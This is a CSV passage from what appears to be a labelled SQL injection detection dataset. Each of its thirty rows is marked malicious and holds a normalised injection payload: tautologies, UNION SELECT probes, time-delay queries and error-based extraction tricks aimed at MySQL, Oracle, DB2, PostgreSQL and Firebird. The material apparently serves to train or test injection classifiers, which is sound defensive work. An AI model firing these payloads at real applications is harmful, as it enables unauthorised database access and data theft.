row_index,payload_norm,label,sqli_type_hint
11130,"1 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) -- cbsd",1,
11131,1 ) where 2223 = 2223,1,
11132,1' where 9416 = 9416,1,
11133,-1459' ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 'eiet' like 'eiet,1,
11134,1'+ ( select somn where 8636 = 8636 rlike sleep ( 5 ) ) +',1,
11135,-3846%' or 6872 = 6872 and '%' = ',1,
11136,"-4929"" where 6381 = 6381 or 8571 = 8571--",1,
11137,1' ) where 1917 = 1917 union all select null#,1,
11138,"-9175' ) ) union all select 6174,6174,6174,6174--",1,
11139,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ""eboa"" like ""eboa",1,
11140,"1, ( select ( case when ( 5334 = 4976 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",1,
11141,1' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 'qfxg' = 'qfxg,1,
11142,"1' and elt ( 9371 = 8882,8882 ) and 'vurh' = 'vurh",1,
11143,"1%"" ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ""%"" = """,1,
11144,"1'+ ( select pdfv where 1172 = 1172 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) ) +'",1,
11145,"1' ) ) as jntr where 5051 = 5051 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,
11146,1' ) ) and 2006 = 2006,1,
11147,"1 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- ztzu",1,
11148,end ) +',1,
11149,"-2197' union all select 8065,8065,8065,8065--",1,
11150,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ""lsvg"" like ""lsvg",1,
11151,"1 ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 5340 = 5340",1,
11152,"1%"" union all select null,null,null,null--",1,
11153,"1' ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 'vjhw' like 'vjhw",1,
11154,1' where 1593 = 1593,1,
11155,"1' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'hbld' = 'hbld",1,
11156,"-3827"" ) or 8571 = 8571--",1,
11157,"1' and make_set ( 9860 = 6956,6956 ) and 'toru' = 'toru",1,
11158,"1 ) ) as gdcg where 2329 = 2329 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
11159,"1"" ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ""zzkc"" = ""zzkc",1,
